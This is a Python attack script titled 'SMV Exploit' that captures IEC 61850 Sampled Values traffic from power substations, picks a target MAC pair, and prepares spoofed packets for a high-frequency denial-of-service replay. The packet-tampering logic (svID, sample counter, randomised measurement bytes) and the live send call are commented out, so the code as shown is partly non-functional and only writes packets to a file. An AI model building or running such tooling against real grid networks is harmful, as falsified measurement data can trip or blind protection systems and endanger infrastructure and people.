# Imports 
import os, sys, datetime, inspect, struct, time, argparse, pyshark
from time import sleep
import random
from scapy.layers.l2 import Ether, Dot1Q

# Imp Imports
from pyasn1.type import univ, char, namedtype, tag, constraint
from pyasn1.codec.ber import decoder, encoder
from scapy.all import *

# Local imports
from smv.sv import SV
from smv.sv_pdu import SavPDU, SeqASDU, ASDU, UtcTime, Data


# network choice and filter
networkInterface = "eth1"
filter_string = "ether proto 0x88ba"
SV_TYPE = 0x88ba


# Tell the script where to find the the local modules
currentdir = os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))
parentdir = os.path.dirname(currentdir)
sys.path.insert(0, parentdir)


# Use argparse to parse the command line arguments
if len(sys.argv) < 2:
    print('[-] For help menu, use -h')
    sys.exit(1)

less_indent_formatter = lambda prog: argparse.RawTextHelpFormatter(prog, max_help_position=8)

parser = argparse.ArgumentParser(description='SMV Exploit.', formatter_class=less_indent_formatter, usage='python3 %(prog)s [options]')
parser.add_argument('--pcapfile', help='Name of the PCAP file to process.')
parser.add_argument('--livecapture', action='store_true', help='Start the live capture. (default: %(default)s)')
parser.add_argument('--store', help=""" Name the file to store the captured packets (should be with .pcap extension).""")
parser.add_argument('--output', help="""Name of the output file to save modified packets (should be with .pcap extension).
                    
Some Examples: 
----------
    python3 %(prog)s --livecapture --store <filename>
    python3 %(prog)s --pcapfile <filename> --output <filename>
    
""")
args = parser.parse_args()



####  DEFINED FUNCTIONS   ####


# CONVERTING THE TIME INTO 64-BITS or 8-BYTES FORM
UTC = 1 # 0: local time 1: UTC Time
def curTime64Bits(utc=False):
    # Microsecond Resolution Ignored
    if UTC:
        curTime = time.mktime(datetime.datetime.utcnow().timetuple())
    else:
        curTime = time.mktime(datetime.datetime.now().timetuple())

    curTimeInt = int(curTime)
    curTimeInt64 = (curTimeInt << 32)
    curTimeInt64Str = curTimeInt64.to_bytes(8,'big')
    return curTimeInt64Str


# Check for SV packets
def sv_check(pkt):
    is_sv = False
    if pkt.haslayer(Ether): 
        if pkt[Ether].type == SV_TYPE: is_sv = True
    if pkt.haslayer(Dot1Q):
        if pkt[Dot1Q].type == SV_TYPE: is_sv = True
    return is_sv


# Decode the packet
def decode_packet(encoded_data):
    
    savpdu = SavPDU().subtype(
        implicitTag = tag.Tag(
            tag.tagClassApplication,
            tag.tagFormatConstructed,
            0
        )
    )
    
    decoded_savpdu , rest_of_data = decoder.decode(
        encoded_data,
        asn1Spec=savpdu
    )
    
    return decoded_savpdu


# Filter packets based on the src and dst MAC addresses
def filter_packets(packet, src_mac, dst_mac):
    if packet.haslayer(Ether):
        if packet[Ether].src == src_mac and packet[Ether].dst == dst_mac:
            return True
    return False


####  INTERACTIVE PART  #####


# Read the given pcap file
if args.pcapfile:
    packets = rdpcap(args.pcapfile)
    print("\n[+] Reading pcap file... "); sleep(1)


# Live capture the packets from a live network
if args.livecapture:
    try:
        print(f"[+] Listening on {networkInterface}"); sleep(1)
        print("[+] YOU SHOULD HAVE SUDO PERMISSIONS TO DO THIS")
        count = int(input('How many packets do you want to capture?: '))
        print("[+] Capturing packets...")
        captureLive = pyshark.LiveCapture(
                interface=networkInterface, 
                bpf_filter=filter_string,
                output_file=args.store
        )

        #captureLive.set_debug()
        captureLive.sniff(packet_count=count)
        captureLive.close()
        print("[+] Capturing done..")
        print("[+] Using the pcap file just captured..")
        packets = rdpcap(args.store)

    except KeyboardInterrupt:
        print('\n[-] Exiting')
        sys.exit(1)


print("[+] Filtering SV packets... "); sleep(1)
print("[+] Decoding the packets... "); sleep(1)




# Store Data
sv_packets = []                 #  to store the SV packets
unique_sv_packets = set()       #  to store the SV packets for specific src and dst MAC addresses


# Extract the SV packets
for packet in packets:
    if sv_check(packet):
        # Add only sv packets to the list
        sv_packets.append(packet)
        
        # Add unique source and destination addresses to the set
        unique_sv_packets.add((packet[Ether].src, packet[Ether].dst))



# Printing a sample packet

perm = input("Do you want to print a sample SV packet?[Y/N]: ")
sample = sv_packets[0]
try:
    if perm in ['y', 'Y']:
        print("[+] Printing the packet details...\n"); sleep(1)
        encoded_data = sample.load
        decoded_savpdu = decode_packet(encoded_data)
        print(decoded_savpdu.prettyPrint())
    elif perm in ['n','N']:
        print("Okay, nvm!\n")
    else:
        print('Invalid Input\n')

except KeyboardInterrupt:
    print('[-] Exiting')



#### FILTERING THE PACKETS #### 

# Convert set of unique addresses to a list and print it
unique_addresses_list = list(unique_sv_packets)

print("\n[+] Scaning for unique source-destination connections..."); sleep(1)
print("Unique source and destination MAC addresses:")
for i, (src, dst) in enumerate(unique_addresses_list):
    print(f"{i}. Source: {src} --> Destination: {dst}")
   
print('\n') 
print(f"Select the destination you want to target in the range [1 to {len(unique_addresses_list)}]: ")
target = int(input("Choose the index:  "))
print('\n') 
sleep(1)

if 1 <= target <= len(unique_addresses_list):   
    src, dst = unique_addresses_list[target-1]
    print(f"Selected source MAC address: {src}")
    print(f"Selected destination MAC address: {dst}")
    print('\n') 

else:
    print("Invalid input!")
    exit(1)
    
    
filtered_packets = [packet for packet in sv_packets if filter_packets(packet, src, dst)]



##########  MODIFYING THE PACKETS  ##########

#### Packets WORKFLOW :)  ####
#  args.pcapfile --> packets --> sv_packets  --> filtered_packets --> packets_to_modify
#                            |
#                            |--> unique_sv_packets --> unique_addresses_list --> src, dst


## Selecting the packets to modify
print(f"[+] Select the packets you want to manipulate in the range of 0 to {len(filtered_packets)}.")
opt = int(input("What do you want to manipulate?\n1. Range\n2. Some packets\nChoose the option: "))

if opt == 1:
    start = int(input("Enter the start index: "))
    end = int(input("Enter the end index: "))
    packets_to_modify = filtered_packets[start:end]

elif opt == 2:
    print("Enter the indexes of the packets you want to modify: ")
    indexes = list(map(int, input().split()))
    packets_to_modify = [filtered_packets[i] for i in indexes]
    
else:
    print("Invalid input!")
    print('[-] Exiting')
    exit(1)


## Manipulating the packets

mod_packets = []


from pyasn1 import debug
debug.setLogger(debug.Debug('all'))

# for pkt in packets_to_modify:
    
#     ## Decoding the packet ##
#     raw_data = pkt.load
#     print(pkt)
#     print(pkt.load)
#     decoded_savpdu = decode_packet(raw_data)
    

    
#     # Extracting the ASDU
#     seq_asdu = decoded_savpdu.getComponentByPosition(1)  
#     asdu = seq_asdu.getComponentByPosition(0)  
    
#     svID = asdu.getComponentByPosition(0)
#     smp_cnt = asdu.getComponentByPosition(1)  
#     confRev = asdu.getComponentByPosition(2)
#     smp_sync = asdu.getComponentByPosition(3)
#     seq_data = asdu.getComponentByPosition(4)
    

#     ### Modification logic  ###
       
#     asdu.setComponentByName('svID', int(svID) + 10)
#     asdu.setComponentByName('smpCnt', 100)
    
#     # Modify the first 3 bytes of seq_data randomly
#     seq_data = bytearray(seq_data)
#     for i in range(3):
#         seq_data[i] = random.randint(0, 255)
#     seq_data = bytes(seq_data)
    
#     asdu.setComponentByName('seqData', seq_data)
    
    
#     ### Encoding the modified packet ###
#     encoded_data = encoder.encode(decoded_savpdu)
    
    
#     ## Packet formation ##
    
    
#     # original packet data 
    
#     # ether data 
#     src = pkt.src
#     dst = pkt.dst
#     type = pkt.type
    
#     # Dot1Q data
#     Prio = pkt[Dot1Q].prio
#     Id = pkt[Dot1Q].id
#     Vlan = pkt[Dot1Q].vlan
#     Type = pkt[Dot1Q].type
    
#     # SV data
#     Appid = pkt[SV].appid   
#     Length = pkt[SV].length
#     Reserved1 = pkt[SV].reserved1
#     Reserved2 = pkt[SV].reserved2
    
    
#     mod_packet = Ether(src=src, dst=dst, type=type)/Dot1Q(prio = Prio, id= Id, vlan=Vlan, type=Type)/SV(appid=Appid, length=Length, reserved1 = Reserved1,reserved2=Reserved2)/encoded_data
 
#     mod_packets.append(mod_packet)  


## PRINTING THE MODIFIED PACKETS ##
debug = input("Do you want to print the modified data?[Y/N]?: ")
if debug in ['y', 'Y']:
    for pkt, mod_packet in zip(packets_to_modify, mod_packets):
        print("\n### Original Packet Data ###")
        print(decode_packet(pkt.load).prettyPrint())
        print("\n### Modified Packet Data ###")
        print(decode_packet(mod_packet.load).prettyPrint())

elif debug in ['n', 'N']:
    print("[+] Moving on to the exploit..")



## SENDING/INJECTING OR SAVING THE MALICIOUS PACKETS ##
attack_choice = input("Do you want to send the modified packets? [Y/N]: ")
if attack_choice in ['y', 'Y']:
    try:
        # SENDING THE FRAMES AT HIGH FREQUENCY   ==> DOS ATTACK
        print('[+] Sending malicious packets...')
        flag = 0
        while(flag < 1000):
            for mod_packet in packets_to_modify:
                # sendp(mod_packet, iface=networkInterface)
                wrpcap("sv_dos.pcapng", mod_packet, append=True)
            flag += 1
            # sleep(5)
    except KeyboardInterrupt:
        print("[-] Stopping the injection...")

elif attack_choice in ['n', 'N']:
    save_choice = input("Do you want to save the modified packets to a file? [Y/N]: ")
    if save_choice in ['y', 'Y']:
        f_name = input("Set filename: ")
        f_name = f_name + ".pcapng"
        try:
            print('[+] Saving the modified packets in pcapng file..')
            for mod_packet in packets_to_modify:
                wrpcap(f_name, mod_packet, append=True)
            print(f"Successfully saved pcapng file as {f_name} !")
            print("\n\n")

        except KeyboardInterrupt:
            print("[-] Exiting!")
    else:
        print("No action taken on modified packets.")
        exit(0)
  
